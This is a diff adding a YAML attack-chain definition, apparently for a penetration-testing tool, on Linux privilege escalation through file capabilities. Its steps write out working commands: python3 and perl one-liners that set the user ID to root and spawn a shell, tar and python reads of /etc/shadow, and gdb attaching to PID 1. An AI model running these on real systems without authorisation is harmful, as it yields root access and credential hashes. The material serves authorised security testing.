@@ -1,0 +1,46 @@
+chain_id: linux_capability_abuse
+title: "Linux privesc — file capability abuse (cap_setuid, cap_dac_read_search, ...)"
+severity: HIGH
+tags: [linux, privesc, capabilities, gtfobins]
+
+trigger:
+  any_of:
+    - { kind: "linux-capability" }
+
+description: |
+  At least one binary carries Linux file capabilities. Capabilities bypass
+  the standard SUID model — a binary with `cap_setuid+ep` can drop
+  privileges to root even without the SUID bit. Look up the binary at
+  https://gtfobins.github.io/ → 'Capabilities' section.
+
+steps:
+  - id: 1
+    title: "List every capability-bearing binary on the box"
+    command: getcap -r / 2>/dev/null
+
+  - id: 2
+    title: "cap_setuid+ep — the classic root drop"
+    command: |
+      # python3 with cap_setuid:
+      /usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+      # perl with cap_setuid:
+      /usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+
+  - id: 3
+    title: "cap_dac_read_search+ep — read any file"
+    command: |
+      # tar with cap_dac_read_search reads /etc/shadow:
+      /usr/bin/tar -cvf shadow.tar /etc/shadow
+      # python equivalent:
+      /usr/bin/python3 -c 'print(open("/etc/shadow").read())'
+
+  - id: 4
+    title: "cap_sys_admin or cap_sys_ptrace — full kernel access"
+    command: |
+      # cap_sys_ptrace lets you attach to any process; PID 1 (init) is the easy target.
+      /usr/bin/gdb -p 1
+      # or with cap_sys_admin: mount, modprobe, namespace tricks.
+
+references:
+  - https://gtfobins.github.io/
+  - https://man7.org/linux/man-pages/man7/capabilities.7.html
